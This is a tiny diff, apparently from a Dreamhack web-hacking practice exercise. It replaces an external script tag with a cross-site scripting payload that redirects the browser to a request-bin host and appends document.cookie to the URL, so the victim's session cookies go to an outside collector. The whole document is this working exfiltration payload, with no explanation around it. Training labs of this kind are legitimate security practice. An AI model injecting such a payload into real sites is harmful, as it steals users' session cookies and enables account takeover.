@@ -1,1 +1,1 @@
-<script src="https://buaii.github.io/dreamhack/test.html"></script>
+location.href="https://lolwrpo.request.dreamhack.games/"+document.cookie
